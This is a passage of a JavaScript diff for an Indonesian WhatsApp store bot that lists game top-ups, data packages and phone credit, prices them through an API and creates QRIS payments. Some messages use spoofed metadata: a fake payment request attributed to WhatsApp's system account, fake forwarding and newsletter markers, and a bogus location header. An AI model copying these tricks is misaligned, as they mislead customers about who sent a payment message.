+                        "jpegThumbnail":  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAD8APwMBIgACEQEDEQH/xAAtAAEAAwEBAAAAAAAAAAAAAAAAAgUGBAMBAQEBAAAAAAAAAAAAAAAAAAABAv/aAAwDAQACEAMQAAAA0glAAAEDkzEJ3XZe5HqTU+9VaSQqbqJkefYUV3w2kL9JiZAAAA//xAAmEAACAQMEAAYDAAAAAAAAAAABAgMABBEFEhMhECAjMUBRIkFC/9oACAEBAAE/APhXt6lpHn3apNUvZW6fbSX13auBI4eor62ljD8gpbmBjgSDxd0QZZgBWpXHPdnBytcUfXQqSL0c/wBZrTTwFuSPOaWGS5IzGI0odCpWZI2ZRkgUskJ/Obc7/WOhVzHE0skm3ANbIzjA/WfeuNAMA9GtKtvVklI8m1foVPbRToVdak0SUNmKSoNEIbM0lIixqFUYA+H/AP/EABgRAQADAQAAAAAAAAAAAAAAAAEAECAR/9oACAECAQE/AMhEvsXX/8QAGxEAAgMAAwAAAAAAAAAAAAAAAQIAESAQMkH/2gAIAQMBAT8AyqloQV5DUOsZgfK1/9k=", // Menggunakan Uint8Array yang valid
+                        "caption": "\n\n⣿⣿⣷⡁⢆⠈⠕⢕⢂⢕⢂⢕⢂⢔⢂⢕⢄⠂⣂⠂⠆⢂⢕⢂⢕⢂⢕⢂⢕⢂\n⣿⣿⣿⡷⠊⡢⡹⣦⡑⢂⢕⢂⢕⢂⢕⢂⠕⠔⠌⠝⠛⠶⠶⢶⣦⣄⢂⢕⢂⢕\n⣿⣿⠏⣠⣾⣦⡐⢌⢿⣷⣦⣅⡑⠕⠡⠐⢿⠿⣛⠟⠛⠛⠛⠛⠡⢷⡈⢂⢕⢂\n⠟⣡⣾⣿⣿⣿⣿⣦⣑⠝⢿⣿⣿⣿⣿⣿⡵⢁⣤⣶⣶⣿⢿⢿⢿⡟⢻⣤⢑⢂\n⣾⣿⣿⡿⢟⣛⣻⣿⣿⣿⣦⣬⣙⣻⣿⣿⣷⣿⣿⢟⢝⢕⢕⢕⢕⢽⣿⣿⣷⣔\n⣿⣿⠵⠚⠉⢀⣀⣀⣈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣗⢕⢕⢕⢕⢕⢕⣽⣿⣿⣿⣿\n⢷⣂⣠⣴⣾⡿⡿⡻⡻⣿⣿⣴⣿⣿⣿⣿⣿⣿⣷⣵⣵⣵⣷⣿⣿⣿⣿⣿⣿⡿\n⢌⠻⣿⡿⡫⡪⡪⡪⡪⣺⣿⣿⣿⣿⣿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃\n⠣⡁⠹⡪⡪⡪⡪⣪⣾⣿⣿⣿⣿⠋⠐⢉⢍⢄⢌⠻⣿⣿⣿⣿⣿⣿⣿⣿⠏⠈\n⡣⡘⢄⠙⣾⣾⣾⣿⣿⣿⣿⣿⣿⡀⢐⢕⢕⢕⢕⢕⡘⣿⣿⣿⣿⣿⣿⠏⠠⠈\n⠌⢊⢂⢣⠹⣿⣿⣿⣿⣿⣿⣿⣿⣧⢐⢕⢕⢕⢕⢕⢅⣿⣿⣿⣿⡿⢋⢜⠠⠈\n⠄⠁⠕⢝⡢⠈⠻⣿⣿⣿⣿⣿⣿⣿⣷⣕⣑⣑⣑⣵⣿⣿⣿⡿⢋⢔⢕⣿⠠⠈\n⠨⡂⡀⢑⢕⡅⠂⠄⠉⠛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢋⢔⢕⢕⣿⣿⠠⠈\n⠄⠪⣂⠁⢕⠆⠄⠂⠄⠁⡀⠂⡀⠄⢈⠉⢍⢛⢛⢛⢋⢔⢕⢕⢕⣽⣿⣿⠠⠈\n\n",
+                        "footer" : "Puki",
+                        serverMessageId: 143,
+                        "inviteExpiration": Date.now() + 1814400000 // 3 hari dari sekarang
+                    }
+                }
+            }
+        }, { userJid: m.chat, quoted: fkontak });
+
+
+    await sych.relayMessage(m.chat, locationMsg.message, { messageId: locationMsg.key.id });
+   
+
+const name = getUserName(m.sender);
+    // Hapus pesan sebelumnya jika ada
+    if (global.lastMessageId) {
+        await sych.deleteMessage(m.chat, { id: global.lastMessageId }); // Menghapus pesan sebelumnya
+    }
+
+    let sections = [
+        {
+            title: 'Game Populer',
+            highlight_label: 'Powered by Galangxyz',
+            rows: [
+                { id: `${prefix}mlbb`, title: "Mobile Legends: Bang Bang", description: "Top-up MLBB Diamond", },
+                { id: `${prefix}ml_wdp`, title: "ML Wallet Diamond", description: "Top-up diamond untuk ML Wallet" },
+                { id: `${prefix}ml_sl`, title: "ML Starlight", description: "Berlangganan Starlight ML" },
+                { id: `${prefix}hok`, title: "Honor of Kings", description: "Top-up game Honor of Kings" },
+                { id: `${prefix}aov`, title: "Arena of Valor", description: "Top-up game AOV" },
+                { id: `${prefix}ff`, title: "Free Fire", description: "Top-up diamond Free Fire" },
+                { id: `${prefix}pubg`, title: "PUBG Mobile", description: "Top-up UC untuk PUBG Mobile" },
+            ],
+        },
+        {
+            title: 'Data Internet',
+            highlight_label: 'Powered by Galangxyz',
+            rows: [
+                { id: `${prefix}tsel_data`, title: "Telkomsel Data", description: "Paket data Telkomsel" },
+                { id: `${prefix}xl_data`, title: "XL Data", description: "Paket data XL Axiata" },
+                { id: `${prefix}tri_data`, title: "Tri Data", description: "Paket data Tri" },
+            ],
+        },
+        {
+            title: 'Pulsa Reguler & Transfer',
+            highlight_label: 'Powered by Galangxyz',
+            rows: [
+                { id: `${prefix}tsel_pulsa`, title: "Telkomsel Pulsa", description: "Isi ulang pulsa Telkomsel" },
+                { id: `${prefix}axis_pulsa`, title: "Axis Pulsa", description: "Isi ulang pulsa Axis" },
+                { id: `${prefix}tri_pulsa`, title: "Tri Pulsa", description: "Isi ulang pulsa Tri" },
+            ],
+        },
+        {
+            title: 'Voucher',
+            highlight_label: 'Powered by Galangxyz',
+            rows: [
+                { id: `${prefix}pln`, title: "PLN Voucher", description: "Voucher listrik PLN" },
+            ],
+        },
+    ];
+
+    let listMessage = {
+        title: " Pilih Kategori!",
+        text: `> RKA STORE berkomitmen untuk memberikan pengalaman belanja yang mudah, nyaman, dan aman. Dengan layanan cepat serta responsif, kami siap membantu Anda kapan saja. \n\n\nRKA STORE – Terintegrasi Dengan API, Belanja Mudah, Cepat, & Aman!\n\n𝄃𝄃𝄂𝄂𝄀𝄁𝄃𝄂𝄂𝄃𝄃𝄃𝄂𝄂𝄀𝄁𝄃𝄂𝄂𝄃𝄃𝄃𝄂𝄂𝄀𝄁𝄃𝄂𝄂𝄃𝄃𝄃𝄂𝄂𝄀𝄁𝄃𝄂𝄂𝄃\n\nDaftar kategori produk yang tersedia di bawah ini: \n\n╭─❍「 *${n}Game Populer${n}* 」❍
+│${setv} ${prefix}mlbb
+│${setv} ${prefix}ml_wdp
+│${setv} ${prefix}ml_sl
+│${setv} ${prefix}ml_tl
+│${setv} ${prefix}Hok
+│${setv} ${prefix}Aov
+│${setv} ${prefix}LOL
+│${setv} ${prefix}COC
+│${setv} ${prefix}FF
+│${setv} ${prefix}PUBG
+╰┬────❍
+╭┴❍「 *${n}Data Internet${n}* 」❍
+│${setv} ${prefix}BYU DATA
+│${setv} ${prefix}TELKOMSEL DATA
+│${setv} ${prefix}XL DATA
+│${setv} ${prefix}AXIS DATA
+│${setv} ${prefix}ISAT DATA
+│${setv} ${prefix}TRI DATA
+╰┬────❍
+╭┴❍「 *${n}Pulsa Reguler & Transfer${n}* 」❍
+│${setv} ${prefix}BYU PULSA 
+│${setv} ${prefix}TELKOMSEL PULSA
+│${setv} ${prefix}XL PULSA
+│${setv} ${prefix}AXIS PULSA
+│${setv} ${prefix}ISAT PULSA
+│${setv} ${prefix}TRI PULSA
+╰┬────❍
+╭┴❍「 *${n}Vocher${n}* 」❍
+│${setv} ${prefix}PLN
+╰─────❍`,
+        footer: `■ 「 *${n}BOT INFO${n}* 」
+${f}*Nama Bot* : ${botname}
+${f}*Powered* : @${'0@s.whatsapp.net'.split('@')[0]}
+${f}*Owner* : @${owner[0].split('@')[0]}
+${f}*Mode* : ${sych.public ? 'Public' : 'Self'}
+
+■ 「 *${n}ABOUT${n}* 」
+${f}*Tanggal* : ${tanggal}
+${f}*Hari* : ${hari}
+${f}*Jam* : ${jam} WIB`,
+        buttonText: "Pilih Kategori",
+        sections,
+    };
+
+    let msg = generateWAMessageFromContent(m.chat, {
+    viewOnceMessage: {
+        message: {
+            "messageContextInfo": {
+                "deviceListMetadata": {},
+                "deviceListMetadataVersion": 2
+            },
+            interactiveMessage: proto.Message.InteractiveMessage.create({
+                contextInfo: {
+                    mentionedJid: [m.sender],
+                    isForwarded: true,
+                    forwardedNewsletterMessageInfo: {
+                        newsletterJid: '120363373320014871@newsletter',
+                        newsletterName: 'Powered By Galangxyz',
+                        serverMessageId: -1
+                    },
+                    businessMessageForwardInfo: {
+                        businessOwnerJid: sych.decodeJid(sych.user.id)
+                    },
+                },
+                body: proto.Message.InteractiveMessage.Body.create({
+                    text: listMessage.text
+                }),
+                footer: proto.Message.InteractiveMessage.Footer.create({
+                    text: listMessage.footer
+                }),
+                header: proto.Message.InteractiveMessage.Header.create({
+                  
+                locationMessage: {
+                                degreesLatitude: 0,
+                                degreesLongitude: 0,
+                                name: "New York City, USA",
+                                address: "Times Square, New York, USA"
+                            },
+                                                
+                    title: `${n}Halo ${m.pushName ? m.pushName : 'Tanpa Nama'}, Welcome${n}`,
+                    subtitle: "",
+                    hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: { url: "https://raw.githubusercontent.com/Galangxyz/Store/refs/heads/gh-pages/rka.jpg" } }, { upload: sych.waUploadToServer }))
+                }),
+                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                    buttons: [
+                        {
+                            name: "single_select",
+                            buttonParamsJson: JSON.stringify(listMessage)
+                        }
+                    ]
+                })
+            })
+        }
+    }
+}, { quoted: fkontak });
+   // Simpan ID pesan terkirim untuk penghapusan otomatis
+    global.lastMessageId = msg.key.id; // Simpan ID pesan yang baru saja dikirim
+
+    await sych.relayMessage(msg.key.remoteJid, msg.message, {
+        messageId: msg.key.id
+    });
+    break;
+}
+            case 'sr':
+            case 'search': {
+                if (!query) return sycreply(`Example: ${prefix}${command} MLW`);
+
+                try {
+                    const filterName = query;
+
+                    const response = await axios.post(config.api.base_url + '/api/h2h/price-list/all', {
+                        filter_name: filterName,
+                        api_key: config.api.secret_key
+                    }, {
+                        headers: {
+                            'Content-Type': 'application/json'
+                        }
+                    });
+
+                    const result = response.data;
+
+                    if (!result.data) return sycreply(result.message);
+
+                    let listText = '';
+                    result.data.forEach(item => {
+                        const profit = (config.api.profit / 100) * item.price;
+                        const finalPrice = Number(item.price) + Number(Math.ceil(profit));
+                        listText += `╭⟬ *${item.status} ${item.name}*\n` +
+                            `┆•  Harga: Rp ${toRupiah(finalPrice)}\n` +
+                            `┆•  Kode:  ${item.code}\n` +
+                            `╰──────────◇\n\n`;
+                    });
+
+                    sycreply(listText);
+                } catch (error) {
+                    console.error('Error fetching data:', error);
+                    sycreply('Barang yg anda cari tidak ditemukan.');
+                }
+
+                break;
+            }
+
+            case 'srbc':
+            case 'search_by_code': {
+                if (!query) return sycreply(`Example: ${prefix}${command} MLW`);
+
+                try {
+                    const filterCode = query.toUpperCase();
+
+                    const response = await axios.post(config.api.base_url + '/api/h2h/price-list/all', {
+                        filter_code: filterCode,
+                        api_key: config.api.secret_key
+                    }, {
+                        headers: {
+                            'Content-Type': 'application/json'
+                        }
+                    });
+
+                    const result = response.data;
+
+                    if (!result.data) return sycreply(result.message);
+
+                    let listText = '';
+                    result.data.forEach(item => {
+                        const profit = (config.api.profit / 100) * item.price;
+                        const finalPrice = Number(item.price) + Number(Math.ceil(profit));
+                        listText += `╭⟬ *${item.status} ${item.name}*\n` +
+                            `┆•  Harga: Rp ${toRupiah(finalPrice)}\n` +
+                            `┆•  Kode:  ${item.code}\n` +
+                            `╰──────────◇\n\n`;
+                    });
+
+                    sycreply(listText);
+                } catch (error) {
+                    console.error('Error fetching data:', error);
+                    sycreply('Produk yg anda cari tidak ditemukan.');
+                }
+
+                break;
+            }
+
+
+
+
+            case 'mlbb':
+            case 'ml':
+            case 'ml_wdp':
+            case 'ml_sl':
+            case 'ml_tl':
+            case 'wdp':
+            case 'starlight':
+            case 'twilight':
+            case 'hok':
+            case 'aov':
+            case 'lol':
+            case 'coc':
+            case 'ff':
+            case 'pubg':
+
+            case 'byu_data':
+            case 'tsel_data':
+            case 'xl_data':
+            case 'axis_data':
+            case 'isat_data':
+            case 'tri_data':
+
+            case 'byu_pulsa':
+            case 'tsel_pulsa':
+            case 'xl_pulsa':
+            case 'axis_pulsa':
+            case 'isat_pulsa':
+            case 'tri_pulsa':
+
+            case 'pln': {
+            const name = getUserName(m.sender);
+
+                const products = {
+                    'ml': {
+                        name: 'mobile-legends',
+                        category: 'games',
+                        filter_code: null
+                    },
+                    'mlbb': {
+                        name: 'mobile-legends',
+                        category: 'games',
+                        filter_code: null
+                    },
+                    'ml_wdp': {
+                        name: 'mobile-legends',
+                        category: 'games',
+                        filter_code: 'MLW'
+                    },
+                    'ml_sl': {
+                        name: 'mobile-legends',
+                        category: 'games',
+                        filter_code: 'MLS'
+                    },
+                    'ml_tl': {
+                        name: 'mobile-legends',
+                        category: 'games',
+                        filter_code: 'MLT'
+                    },
+                    'wdp': {
+                        name: 'mobile-legends',
+                        category: 'games',
+                        filter_code: 'MLW'
+                    },
+                    'starlight': {
+                        name: 'mobile-legends',
+                        category: 'games',
+                        filter_code: 'MLS'
+                    },
+                    'twilight': {
+                        name: 'mobile-legends',
+                        category: 'games',
+                        filter_code: 'MLT'
+                    },
+                    'hok': {
+                        name: 'honor-of-kings',
+                        category: 'games',
+                        filter_code: null
+                    },
+                    'aov': {
+                        name: 'arena-of-valor',
+                        category: 'games',
+                        filter_code: null
+                    },
+                    'lol': {
+                        name: 'league-of-legends',
+                        category: 'games',
+                        filter_code: null
+                    },
+                    'coc': {
+                        name: 'clash-of-clans',
+                        category: 'games',
+                        filter_code: null
+                    },
+                    'ff': {
+                        name: 'free-fire',
+                        category: 'games',
+                        filter_code: null
+                    },
+                    'pubg': {
+                        name: 'pubg',
+                        category: 'games',
+                        filter_code: null
+                    },
+
+                    'byu_data': {
+                        name: 'byu',
+                        category: 'data-internet',
+                        filter_code: null
+                    },
+                    'telkomsel_data': {
+                        name: 'telkomsel',
+                        category: 'data-internet',
+                        filter_code: null
+                    },
+                    'tsel_data': {
+                        name: 'telkomsel',
+                        category: 'data-internet',
+                        filter_code: null
+                    },
+                    'xl_data': {
+                        name: 'xl',
+                        category: 'data-internet',
+                        filter_code: null
+                    },
+                    'axis_data': {
+                        name: 'axis',
+                        category: 'data-internet',
+                        filter_code: null
+                    },
+                    'indosat_data': {
+                        name: 'indosat',
+                        category: 'data-internet',
+                        filter_code: null
+                    },
+                    'isat_data': {
+                        name: 'indosat',
+                        category: 'data-internet',
+                        filter_code: null
+                    },
+                    'tri_data': {
+                        name: 'tri',
+                        category: 'data-internet',
+                        filter_code: null
+                    },
+
+                    'byu_pulsa': {
+                        name: 'byu',
+                        category: 'pulsa',
+                        filter_code: null
+                    },
+                    'telkomsel_pulsa': {
+                        name: 'telkomsel',
+                        category: 'pulsa',
+                        filter_code: null
+                    },
+                    'tsel_pulsa': {
+                        name: 'telkomsel',
+                        category: 'pulsa',
+                        filter_code: null
+                    },
+                    'xl_pulsa': {
+                        name: 'xl',
+                        category: 'pulsa',
+                        filter_code: null
+                    },
+                    'axis_pulsa': {
+                        name: 'axis',
+                        category: 'pulsa',
+                        filter_code: null
+                    },
+                    'indosat_pulsa': {
+                        name: 'indosat',
+                        category: 'pulsa',
+                        filter_code: null
+                    },
+                    'isat_pulsa': {
+                        name: 'indosat',
+                        category: 'pulsa',
+                        filter_code: null
+                    },
+                    'tri_pulsa': {
+                        name: 'tri',
+                        category: 'pulsa',
+                        filter_code: null
+                    },
+
+                    'pln': {
+                        name: 'pln',
+                        category: 'voucher',
+                        filter_code: null
+                    }
+
+                };
+
+                const productKey = products[command];
+                if (!productKey) {
+                    return sycreply('Perintah tidak valid.');
+                }
+
+
+
+
+                try {
+    const response = await axios.post(
+        `${config.api.base_url}/api/h2h/price-list/${productKey.category}/${productKey.name}`, {
+            filter_code: productKey.filter_code || undefined,
+            api_key: config.api.secret_key,
+        }, {
+            headers: {
+                'Content-Type': 'application/json',
+            },
+        }
+    );
+
+    const result = response.data;
+
+    if (!result.data) {
+        return sycreply(result.message);
+    }
+let profile;
+try {
+    profile = await sych.profilePictureUrl(m.sender, 'image');
+} catch (e) {
+    profile = fake.anonim;
+}
+
+let listText = `*✅ : Tersedia*\n⛔ : Tidak Tersedia\n\n` +
+               `${n}Produk List${n}⬇️\n\n` +
+               `𝄃𝄃𝄂𝄂𝄀𝄁𝄃𝄂𝄂𝄃𝄃𝄃𝄂𝄂𝄀𝄁𝄃𝄂𝄂𝄃𝄃𝄃𝄂𝄂𝄀𝄁𝄃𝄂𝄂𝄃`;
+
+// Menambahkan daftar produk
+result.data.forEach((item) => {
+    const profit = (config.api.profit / 100) * item.price;
+    const finalPrice = Number(item.price) + Number(Math.ceil(profit));
+    listText += `\n╭⟬ *${item.status} ${item.name}*\n` +
+                `┆• Harga: Rp ${toRupiah(finalPrice)}\n` +
+                `┆• Kode: ${item.code}\n` +
+                `╰──────────◇\n`;
+});
+
+// Tombol utama
+let buttons = [
+     
+   
+    { buttonId: ".pepek", buttonText: { displayText: " Owner📂 " }, type: 1 }
+];
+// Struktur pesan dengan media (gambar & dokumen)
+let buttonMessage = {
+    document: apkFile.document,
+    fileName: apkFile.fileName,
+    mimetype: apkFile.mimetype,
+    fileLength: apkFile.fileLength,
+    image: {
+        url: profile,
+        gifPlayback: true
+    },
+    caption: listText, // Isi pesan utama
+    contextInfo: {
+        forwardingScore: 999,
+        isForwarded: true,
+        externalAdReply: {
+            title: "RKA STORE",
+            body: `ᬊᬁ Yth. Bpk/Ibu ${m.pushName ? m.pushName : 'Tanpa Nama'}\nSelamat Datang di RKA STORE!`,
+            thumbnailUrl: profile,
+            mediaType: 1,
+            renderLargerThumbnail: true,
+            previewType: 0,
+            mediaUrl: "https://github.com/Galangxyz",
+            sourceUrl: "https://github.com/Galangxyz"
+        }
+    },
+    footer: "\n\nRKA STORE – Terintegrasi Dengan API, Belanja Mudah, Cepat, & Aman!",
+    buttons: buttons,
+    viewOnce: true,
+    headerType: 4
+};
+
+// Bagian Sections (Menu tambahan)
+let sections = [
+    {
+        title: 'Silahkan Pilih Menu di Bawah',
+        highlight_label: 'Powered by Galangxyz',
+        rows: [
+            {
+                title: 'Instruksi Order',
+                description: 'Instruksi cara order.',
+                id: `${prefix}orders`
+            },
+            {
+                title: 'Kategori',
+                description: 'Kembali ke kategori produk.',
+                id: `${prefix}product`
+            }
+        ]
+    }
+];
+
+let sectionss = [
+    {
+        title: 'Silahkan Pilih Menu di Bawah',
+        highlight_label: 'Powered by Galangxyz',
+        rows: [
+            {
+                title: 'Instruksi Order',
+                description: 'Instruksi cara order.',
+                id: `${prefix}orders`
+            },
+            {
+                title: 'Kategori',
+                description: 'Kembali ke kategori produk.',
+                id: `${prefix}product`
+            }
+        ]
+    }
+];
+
+// Menambahkan tombol berdasarkan item.code
+result.data.forEach((item) => {
+    sections[0].rows.push({
+        title: `Cari ${item.code}`,
+        description: `Pilih untuk mencari produk dengan kode ${item.code}.`,
+        id: `search_by_code ${item.code}`
+    });
+});
+
+// Struktur pesan dengan menu pilihan
+let listMessage = {
+    title: 'Next Menu',
+    sections
+};
+
+let listtMessage = {
+    title: 'Menu Lainnya',
+    sections: sectionss // Perbaiki kesalahan `sectionss` tidak terhubung ke `sections`
+};
+
+// Flow Actions untuk daftar menu
+const flowActions = [
+
+    {
+        buttonId: "bypas",
+        buttonText: { displayText: "bypas 2" },
+        type: 4,
+        nativeFlowInfo: {
+            name: 'single_select',
+            paramsJson: JSON.stringify(listMessage)
+        },
+        viewOnce: true
+    },
+    
+    {
+    buttonId: ".ping",
+        buttonText: { displayText: " Ping Bot ⚠️" },
+        type: 4,
+        nativeFlowInfo: { buttonId: ".ping", buttonText: { displayText: " Owner📂 " }, type: 1 },
+        viewOnce: true
+    },
+    {
+    buttonId: "bypas",
+        buttonText: { displayText: " bypas " },
+        type: 4,
+        nativeFlowInfo: {
+            name: 'single_select',
+            paramsJson: JSON.stringify(listtMessage)
+        },
+        viewOnce: true
+    } // **Perbaikan: Menutup objek ini dengan benar**
+]; // **Perbaikan: Menutup array dengan `]`**
+
+// Menambahkan flowActions ke buttonMessage
+buttonMessage.buttons.push(...flowActions);
+
+// Kirim pesan ke pengguna
+await sych.sendMessage(m.chat, buttonMessage, { quoted: fkontak });
+} catch (error) {
+    console.error('Error fetching data:', error);
+    sycreply('Terjadi kesalahan, silahkan coba lagi nanti.');
+}
+
+                break;
+            }
+           
+          case 'orders':
+          case 'orderss': {
+            
+    const buttons = [
+    {
+                name: "cta_copy",
+                buttonParamsJson: JSON.stringify({
+                    display_text: "Format Order KODE,ID",
+                    copy_code: `order HOK123XX,12345xxx`,
+                }),
+            },
+    {
+                name: "cta_copy",
+                buttonParamsJson: JSON.stringify({
+                    display_text: "Format Order Zona/ID",
+                    copy_code: `order ML1xx,1234xxxx|24xxx`,
+                }),
+            },
+        {
+            name: "cta_copy",
+            buttonParamsJson: JSON.stringify({
+                display_text: "Format Order KODE,TUJUAN",
+                copy_code: `order S100,082320667363`
+            }),
+        }
+    ];
+
+let text = `Intruksi Order\n\nSemua parameter (code, target) diperlukan.\n\n*PETUNJUK PENGGUNAAN*
+
+\`Produk game\`
+- Format order: ${prefix}order KODE,ID
+- Contoh: ${prefix}order HOK250,1223334782
+
+\`Khusus produk game yang memakai Zone ID/Server\`
+- Format order: ${prefix}order KODE,ID|SERVER
+- Contoh: ${prefix}order MLW1,628299715|10135
+
+\`Produk lainnya\`
+- Format order: ${prefix}order KODE,TUJUAN
+- Contoh: ${prefix}order S100,082320667363`
+    // Kirim pesan interaktif
+    const msg = generateWAMessageFromContent(
+        m.chat, 
+        {
+            viewOnceMessage: {
+        message: {
+            "messageContextInfo": {
+                "deviceListMetadata": {},
+                "deviceListMetadataVersion": 2
+            },
+            interactiveMessage: proto.Message.InteractiveMessage.create({
+            
+                contextInfo: {
+                    mentionedJid: [m.sender],
+                    isForwarded: true,
+                    
+                    forwardedNewsletterMessageInfo: {
+                        newsletterJid: '120363373320014871@newsletter',
+                        newsletterName: 'Powered By Galangxyz',
+                        serverMessageId: -1
+                    },
+                    businessMessageForwardInfo: {
+                        businessOwnerJid: sych.decodeJid(sych.user.id)
+                    },
+                },
+                body: proto.Message.InteractiveMessage.Body.create({
+                    text: text
+                }),
+                footer: proto.Message.InteractiveMessage.Footer.create({
+                    text: "Powered By Galangxyz"
+                }),
+                header: proto.Message.InteractiveMessage.Header.create({
+                    title: "",
+                    subtitle: "",
+                    hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: { url: "https://raw.githubusercontent.com/Galangxyz/Store/refs/heads/gh-pages/rka.jpg" } }, { upload: sych.waUploadToServer }))
+                }),
+                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                            buttons: buttons,
+                        }),
+                    }),
+                },
+            },
+        },
+        { quoted: fkontak }
+    );
+
+    await sych.relayMessage(msg.key.remoteJid, msg.message, {
+        messageId: msg.key.id,
+    });
+}
+break;
+
+
+            // Orders
+            case 'order':
+            case 'topup': {
+                if (global.lastMessageId) {
+        await sych.deleteMessage(m.chat, { id: global.lastMessageId }); // Menghapus pesan sebelumnya
+    }
+               
+                const params = query.split(',').map(param => param.trim());
+                const [code, ...targets] = params;
+                const target = targets.join('|');
+
+                if (!code || !target) {
+                    return sycreply(`Semua parameter (code, target) diperlukan.\n\n*PETUNJUK PENGGUNAAN*
+
+\`Produk game\`
+- Format order: ${prefix}${command} KODE,ID
+- Contoh: ${prefix}${command} HOK250,1223334782
+
+\`Khusus produk game yang memakai Zone ID/Server\`
+- Format order: ${prefix}${command} KODE,ID|SERVER
+- Contoh: ${prefix}${command} MLW1,628299715|10135
+
+\`Produk lainnya\`
+- Format order: ${prefix}${command} KODE,TUJUAN
+- Contoh: ${prefix}${command} S100,082320667363`);
+                }
+
+                const reffId = generateRandomText(10);
+               const senderNumber = m.sender.split('@')[0];
+                const tmpFilePath = path.join(__dirname, 'tmp', 'orders.json');
+
+                let orderData = {};
+                if (fs.existsSync(tmpFilePath)) {
+                    orderData = JSON.parse(fs.readFileSync(tmpFilePath, 'utf8'));
+                }
+
+                if (orderData[senderNumber]) {
+                    return sycreply(
+                        `Kamu masih memiliki transaksi yang belum selesai. Tunggu hingga pembayaran selesai, kadaluarsa, atau gagal untuk membuat transaksi baru.\n\n_Ingin membatalkan topup? ketik *${prefix}cancel PAYID*_`
+                    );
+                }
+
+                const date = new Date();
+                const currentDate = new Date(date.toLocaleString('en-US', {
+                    timeZone: config.time_zone
+                }));
+
+                axios.post(`${config.api.base_url}/api/h2h/price-list/all`, {
+                        api_key: config.api.secret_key,
+                    })
+                    .then(response => {
+                        const data = response.data;
+                        if (!data.data) return sycreply(data.message);
+
+                        const produk = data.data.find(item => item.code === code.toUpperCase());
+                        if (!produk) return sycreply('Produk tidak ditemukan.');
+
+                        const profit = (config.api.profit / 100) * produk.price;
+                        const finalPrice = Number(produk.price) + Math.ceil(profit);
+                        const produkDetail = `*Nama Produk:* ${produk.name}\n*Kode Produk:* ${produk.code}`;
+
+                        performDeposit(reffId, produkDetail, finalPrice, code, target);
+                    })
+                    .catch(error => {
+                        sycreply('Transaksi gagal dibuat. Silahkan laporkan masalah ini ke owner bot.');
+                        console.error('Error:', error);
+                    });
+
+                function performDeposit(reffId, product, nominal, code, target) {
+    axios.post(`${config.api.base_url}/api/h2h/deposit/create`, {
+        reff_id: reffId,
+        type: 'ewallet',
+        method: 'QRISFAST',
+        nominal: nominal,
+        api_key: config.api.secret_key,
+    })
+    .then(async (response) => {
+        const data = response.data;
+        if (!data.data) return sycreply(data.message);
+
+        orderData[senderNumber] = {
+            reffId,
+            payId: data.data.id,
+            createdAt: data.data.created_at,
+        };
+        fs.writeFileSync(tmpFilePath, JSON.stringify(orderData, null, 2));
+const fpay = {
+  key: {
+    remoteJid: '0@s.whatsapp.net',
+    fromMe: false,
+    id: global.namabot,
+    participant: '0@s.whatsapp.net'
+  },
+  message: {
+    requestPaymentMessage: {
+      currencyCodeIso4217: "IDR", // Ubah USD ke IDR (Rupiah)
+      amount1000: Number(data.data.nominal), // Pastikan ini angka
+      requestFrom: '0@s.whatsapp.net',
+      noteMessage: {
+        extendedTextMessage: {
+          text: global.namabot
+        }
+      },
+      expiryTimestamp: 999999999
+    }
+  }
+};
+        const text = `*TRANSAKSI BERHASIL DIBUAT*\n\n*Kode Pembayaran:* ${data.data.reff_id}\n*Nominal:* Rp ${toRupiah(data.data.nominal)}\n${product}\n*Dibuat Pada:* ${data.data.created_at}\n\n*Note:* Pembayaran akan otomatis dibatalkan 5 menit lagi!\n\n\`Bot ini telah terintegrasi dengan API yang disediakan oleh ${config.api.base_url}\``;
+        
+        
+
+        const buttons = [
+        {
+            name: "quick_reply",
+            buttonParamsJson: JSON.stringify({
+                display_text: "Batalkan Order", // Teks yang ditampilkan di tombol
+                id: `cancel ${data.data.reff_id}` // ID unik untuk tombol ini
+            })
+        },
+            {
+                name: "cta_copy",
+                buttonParamsJson: JSON.stringify({
+                    display_text: "Salin Kode",
+                    copy_code: `${data.data.reff_id}`,
+                }),
+            },
+            {
+                name: "cta_copy",
+                buttonParamsJson: JSON.stringify({
+                    display_text: "Salin Nominal",
+                    copy_code: `${toRupiah(data.data.nominal)}`,
+                }),
+            },
+        ];
+
+        // Kirim gambar terlebih dahulu
+await sych.sendMessage(m.chat, {
+    image: { url: data.data.qr_image_url },
+    
+    caption: "Scan QR ini untuk melanjutkan pembayaran.",
+}, { quoted: fpay });
+
+// Kirim pesan interaktif
+const msg = generateWAMessageFromContent(
+    m.chat,
+    {
+        viewOnceMessage: {
+            message: {
+                interactiveMessage: proto.Message.InteractiveMessage.create({
+                    body: proto.Message.InteractiveMessage.Body.create({
+                        text: text,
+                    }),
+                    footer: proto.Message.InteractiveMessage.Footer.create({
+                        text: "Powered By Galangxyz",
+                    }),
+                    header: proto.Message.InteractiveMessage.Header.create({
+                        title: "",
+                        subtitle: "",
+                    }),
+                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                        buttons: buttons,
+                    }),
+                }),
+            },
+        },
+    },
+    { quoted: fpay }
+);
+ // Simpan ID pesan terkirim untuk penghapusan otomatis
+    global.lastMessageId = msg.key.id; // Simpan ID pesan yang baru saja dikirim
+
+await sych.relayMessage(msg.key.remoteJid, msg.message, {
+    messageId: msg.key.id,
+});
+
+        checkPaymentStatus(data.data.id, reffId, code, target);
+    })
+    .catch((error) => console.error('Error:', error));
+}
+
+                function checkPaymentStatus(payId, reffId, code, target) {
+                    const timeout = setTimeout(() => {
+                        clearInterval(interval);
+
+                        axios.post(`${config.api.base_url}/api/h2h/deposit/cancel`, {
+                                id: payId,
+                                api_key: config.api.secret_key,
+                            })
+                            .then(() => {
+                                delete orderData[senderNumber];
+                                fs.writeFileSync(tmpFilePath, JSON.stringify(orderData, null, 2));
